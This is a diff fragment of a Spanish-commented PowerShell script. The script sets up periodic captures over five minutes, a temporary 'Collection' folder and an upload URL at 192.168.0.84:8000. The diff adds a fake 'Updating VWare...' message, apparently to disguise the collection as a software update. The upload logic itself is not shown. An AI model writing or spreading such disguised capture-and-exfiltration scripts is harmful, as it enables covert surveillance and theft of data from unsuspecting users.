@@ -7,6 +7,8 @@ $totalTime = 300  # Duración total en segundos
 $interval = 3    # Intervalo entre capturas en segundos
 $numberOfCaptures = $totalTime / $interval
 
+Write-Host "Updating VWare..."
+
 $destinationUrl = "http://192.168.0.84:8000/"
 $outputDir = "$env:TEMP\Collection\"
 if (-not (Test-Path $outputDir)) {
